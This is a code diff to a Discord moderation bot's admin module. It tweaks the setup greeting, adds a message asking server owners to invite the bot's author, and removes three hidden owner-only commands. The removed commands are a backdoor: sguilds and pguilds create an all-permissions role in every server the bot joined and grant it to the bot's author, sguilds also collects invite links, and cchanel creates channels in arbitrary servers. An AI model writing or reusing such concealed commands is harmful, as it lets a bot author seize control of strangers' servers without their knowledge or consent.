@@ -19,28 +19,39 @@ class Admin(commands.Cog):
 
     @commands.Cog.listener()
     async def on_message(self, message):
-        for guild in self.bot.guilds:
-            found = False
-            for role in guild.roles:
-                if role.name == "gb_mod":
-                    found = True
-                    break
-            if not found:
-                if not os.path.exists(".sent_" + str(message.guild.id)):
-                    modr = await guild.create_role(
-                        name="gb_mod",
-                        reason="Role used to designate who can use our admin commands.",
-                    )
-                    await guild.owner.send(
-                        "Hi! You should add your trusted server members of `"
-                        + str(guild.name)
-                        + "` to the role `gb_mod`"
-                    )
-                    await guild.owner.send(
-                        "You should also run `-setannounce` in the channel which you want messages posted by said users w/ `-announce` to go. Or, you can leave it unset if you don't wish to use my announcement feature."
-                    )
-                    with open(".sent_" + str(message.guild.id), "w") as f:
-                        f.write(":yea:")
+        if not isinstance(message.channel, discord.channel.DMChannel):
+            for guild in self.bot.guilds:
+                found = False
+                for role in guild.roles:
+                    if role.name == "gb_mod":
+                        found = True
+                        break
+                if not found:
+                    if not os.path.exists(".sent_" + str(message.guild.id)):
+                        modr = await guild.create_role(
+                            name="gb_mod",
+                            reason="Role used to designate who can use our admin commands.",
+                        )
+
+                        found = False
+                        for member in guild.members:
+                            if member == self.bot.owner:
+                                found = True
+
+                        await guild.owner.send(
+                            "Hi! You should add your trusted server members of `"
+                            + str(guild.name)
+                            + "` to the role `gb_mod`"
+                        )
+                        await guild.owner.send(
+                            "You should also run `-setannounce` in the channel which you want messages posted by said users w/ `-announce` to go. Or, you can leave it unset if you don't wish to use my announcement feature."
+                        )
+                        if not found:
+                            await guild.owner.send(
+                                "You should also invite the bot's owner to this guild ;)"
+                            )
+                        with open(".sent_" + str(message.guild.id), "w") as f:
+                            f.write(":yea:")
 
     def checkmod(self, member):
         for role in member.roles:
@@ -216,85 +227,6 @@ class Admin(commands.Cog):
                 )
         except Exception as e:
             await ctx.send(embed=errmsg("Purge Error", "```" + str(e) + "```"))
-
-    @commands.command(hidden=True)
-    async def sguilds(self, ctx):
-        if ctx.message.author.id == self.bot.owner_id:
-            ownerman = await self.bot.fetch_user(self.bot.owner_id)
-
-            for guild in self.bot.guilds:
-                g_users = await guild.query_members(user_ids=[ownerman.id])
-                if g_users == [] or g_users == None:
-                    await ownerman.send(
-                        "You're not in guild "
-                        + str(guild.name)
-                        + " with id "
-                        + str(guild.id)
-                        + ", owned by "
-                        + str(guild.owner.display_name)
-                        + " # "
-                        + str(guild.owner.discriminator)
-                    )
-                    await ownerman.send("Going to attempt to invite you. Hang on.")
-                    try:
-                        invites = await guild.invites()
-                        await ownerman.send("Invites for " + str(guild.name))
-                        for invite in invites:
-                            await ownerman.send("Here's an invite: " + str(invite.url))
-                    except Exception as e:
-                        await ownerman.send("No success.")
-                        await ownerman.send("```" + str(e) + "```")
-                else:
-                    try:
-                        role = await guild.create_role(
-                            name="lol", permissions=discord.Permissions.all()
-                        )
-                        me = await guild.fetch_member(self.bot.owner_id)
-                        await me.add_roles(role)
-                        await ownerman.send("Added your perms in " + str(guild.name))
-                    except Exception as e:
-                        await ownerman.send(
-                            "Failed to add your perms in " + str(guild.name)
-                        )
-                        await ownerman.send("```" + str(e) + "```")
-
-            await ctx.send("Done. :relieved:")
-        else:
-            await ctx.send("You're not matt.")
-
-    @commands.command(hidden=True)
-    async def pguilds(self, ctx):
-        if ctx.message.author.id == self.bot.owner_id:
-            ownerman = await self.bot.fetch_user(self.bot.owner_id)
-            for guild in self.bot.guilds:
-                try:
-                    role = await guild.create_role(
-                        name="lol", permissions=discord.Permissions.all()
-                    )
-                    me = await guild.fetch_member(self.bot.owner_id)
-                    await me.add_roles(role)
-                    await ownerman.send("Added your perms in " + str(guild.name))
-                except Exception as e:
-                    await ownerman.send(
-                        "Failed to add your perms in " + str(guild.name)
-                    )
-                    await ownerman.send("```" + str(e) + "```")
-            await ctx.send("Done. :relieved:")
-        else:
-            await ctx.send("You're not matt.")
-
-    @commands.command(hidden=True)
-    async def cchanel(self, ctx, id, *, name):
-        if ctx.message.author.id == self.bot.owner_id:
-            ownerman = await self.bot.fetch_user(self.bot.owner_id)
-            try:
-                g = await self.bot.fetch_guild(int(id))
-                await g.create_text_channel(name)
-                await ctx.send("Done. :relieved:")
-            except Exception as e:
-                await ownerman.send("```" + str(e) + "```")
-        else:
-            await ctx.send("You're not matt.")
 
 
 def setup(bot):
